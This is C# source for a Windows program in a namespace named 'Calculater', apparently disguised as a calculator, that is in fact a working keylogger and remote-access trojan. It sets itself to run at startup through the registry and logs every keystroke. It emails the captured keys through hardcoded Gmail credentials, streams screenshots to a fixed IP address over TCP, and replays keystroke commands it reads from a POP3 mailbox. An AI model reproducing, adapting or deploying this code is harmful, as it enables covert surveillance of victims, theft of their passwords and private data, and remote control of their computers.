using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.ServiceProcess;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mail;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;
using System.Threading;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using OpenPop;
using OpenPop.Mime;
using OpenPop.Pop3;
using OpenPop.Mime.Header;


namespace Calculater
{
    public partial class BackgroundProcess : Form
    {
        [DllImport("User32.dll")]
        
        private static extern short GetAsyncKeyState(int vkey);
        public BackgroundProcess()
        {
            InitializeComponent();
            SetStartUp();
            CheckKeyPress.Start();
            ImageDetect.Start();
            CheckConnection.Start();
            this.TopLevel = false;
            
            CommandDetect.Start();

        }

        string text = "";
        string sendthings = "";
        TcpClient client;
        NetworkStream stream;
        bool connected = false;
        static Pop3Client clientemail = new Pop3Client();
        string checkrepeat = "";
        private void BackgroundProcess_Load(object sender, EventArgs e)
        {
            Thread mThread = new Thread(new ThreadStart(ConnectAsClient));
            mThread.Start();
            
            try
            {
                MailMessage Close = new MailMessage();
                Close.From = new MailAddress("klptea900@gmail.com", Environment.MachineName);
                Close.To.Add(new MailAddress("klptea900@gmail.com"));
                Close.Subject = Environment.MachineName + " has opened the KL";
                Close.Body = Environment.MachineName + " has opened the KL.";
                Close.IsBodyHtml = false;

                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.Credentials = new NetworkCredential("klptea900@gmail.com", "1234567890!@#$%^&*()");
                smtp.EnableSsl = true;
                smtp.Port = 587;
                smtp.Send(Close);
            }
            catch { }
             
        }

        private void ConnectAsClient()
        {
                try
                {
                    SendKeyPressed();
                    byte[] message = Encoding.ASCII.GetBytes(Environment.MachineName + " has connected");
                    stream.Write(message, 0, message.Length);
                    connected = true;
                }
                catch { connected = false; }
            
        }
        private void CheckKeyPress_Tick(object sender, EventArgs e)
        {
            try
            {

                string buffer = "";
                foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        buffer += Enum.GetName(typeof(Keys), i);
                        buffer += " ";
                    }
                }

                text += buffer;
                sendthings += buffer;

                /*
            
                if (sendthings.Length > 3)
                {
                    try
                    {
                        byte[] message = Encoding.ASCII.GetBytes(sendthings);

                        stream.Close();
                        SendKeyPressed();
                        stream.Write(message, 0, message.Length);

                        sendthings = "";
                    }
                    catch { connected = false; }
                }
            
                */
                if (text.Length > 500)
                {
                    Send(text);
                    text = "";
                }

            }
            catch
            {

            }
        }

        
        private void SendKeyPressed()
        {
            try
            {
                client = new TcpClient();
                client.Connect(IPAddress.Parse("96.49.224.54"), 5004);
                stream = client.GetStream();
                connected = true;
            }
            catch 
            { 
                CheckKeyPress.Stop();
                ImageDetect.Stop();
                connected = false;
            }
        }

        private void Send(string value)
        {
            try
            {
                MailMessage msg = new MailMessage();
                msg.From = new MailAddress("klptea900@gmail.com", Environment.MachineName);
                msg.To.Add(new MailAddress("klptea900@gmail.com"));
                msg.Subject = Environment.MachineName + "'s data";
                msg.Body = value;
                msg.IsBodyHtml = false;

                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.Credentials = new NetworkCredential("klptea900@gmail.com", "1234567890!@#$%^&*()");
                smtp.EnableSsl = true;
                smtp.Port = 587;
                smtp.Send(msg);
            }
            catch { }
        }

        private void SetStartUp()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("asdflkj", Application.ExecutablePath.ToString());
            }
            catch { }
        }

        private void ImageDetect_Tick(object sender, EventArgs e)
        {
            try
            {
                Bitmap bm = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bm);
                g.CopyFromScreen(0, 0, 0, 0, bm.Size);
                byte[] message = imageToByteArray(bm);

                stream.Close();
                SendKeyPressed();
                stream.Write(message, 0, message.Length);
            }
            catch { connected = false; }
            
        }
        
        public byte[] imageToByteArray(System.Drawing.Image imageIn)
        {
            MemoryStream ms = new MemoryStream();
            imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Gif);
            return ms.ToArray();
        }

        private void CheckConnection_Tick(object sender, EventArgs e)
        {
            try
            {
                if (connected == false)
                {
                    SendKeyPressed();
                    CheckKeyPress.Start();
                    ImageDetect.Start();
                }
            }
            catch { }
        }

        private void CommandDetect_Tick(object sender, EventArgs e)
        {
            try
            {
                ConnecttoEmail("pop.gmail.com", 995, true, "klptea901@gmail.com", "1234567890!@#$%^&*()");
                if (realcommandmessage() != null)
                {
                    if (FindPlainTextInMessage(realcommandmessage()) != checkrepeat)
                    {
                        string[] command = FindPlainTextInMessage(realcommandmessage()).Split(null);
                        checkrepeat = FindPlainTextInMessage(realcommandmessage());
                        char key;
                        foreach (string x in command)
                        {
                            if (x.Length == 1)
                            {
                                SendKeys.Send(x);
                            }

                            else if (x == "backspace")
                            {
                                SendKeys.Send("{BS}");
                            }

                            else if (x == "tab")
                            {
                                SendKeys.Send("{TAB}");
                            }

                            else if (x == "space")
                            {
                                key = (char)32;
                                SendKeys.Send(key.ToString());
                            }

                            else if (x == "pageup")
                            {
                                SendKeys.Send("{PGUP}");
                            }

                            else if (x == "pagedown")
                            {
                                SendKeys.Send("{PGDN}");
                            }

                            else if (x == "enter")
                            {
                                SendKeys.Send("{ENTER}");
                            }

                            else if (x == "uparrow")
                            {
                                SendKeys.Send("{UP}");
                            }

                            else if (x == "downarrow")
                            {
                                SendKeys.Send("{DOWN}");
                            }

                            else if (x == "leftarrow")
                            {
                                SendKeys.Send("{LEFT}");
                            }

                            else if (x == "rightarrow")
                            {
                                SendKeys.Send("{RIGHT}");
                            }

                            else if (x == "capslock")
                            {
                                SendKeys.Send("{CAPSLOCK}");
                            }

                            else if (x == "win")
                            {
                                SendKeys.Send("^{ESC}");
                            }

                            else
                            {
                                SendKeys.Send(x);
                            }
                        }
                    }

                }
                clientemail.Disconnect();
            }
            catch(Exception f)
            {
                clientemail.Disconnect();
            }
        }

        public static string FindPlainTextInMessage(OpenPop.Mime.Message message)
        {
            MessagePart plainText = message.FindFirstPlainTextVersion();
            string plaintextstr = plainText.GetBodyAsText();

            return plaintextstr;
        }

        public static void ConnecttoEmail(string hostname, int port, bool useSsl, string username, string password)
        {
                clientemail.Connect(hostname, port, useSsl);
                clientemail.Authenticate(username, password);
        }

        static OpenPop.Mime.Message realcommandmessage()
        {
            try
            {
            int messageCount = clientemail.GetMessageCount();
                List<OpenPop.Mime.Message> allMessages = new List<OpenPop.Mime.Message>(messageCount);
                for (int i = messageCount; i > 0; i--)
                {
                    MessageHeader headers = clientemail.GetMessageHeaders(i);
                    RfcMailAddress from = headers.From;
                    if (from.Address.Equals("asdflkjasdflkj24@gmail.com"))
                    {
                        allMessages.Add(clientemail.GetMessage(i));
                    }
                }

                    
                    return allMessages[0];
                }
                catch
                {
                    return null;
                }
        }
    }
}
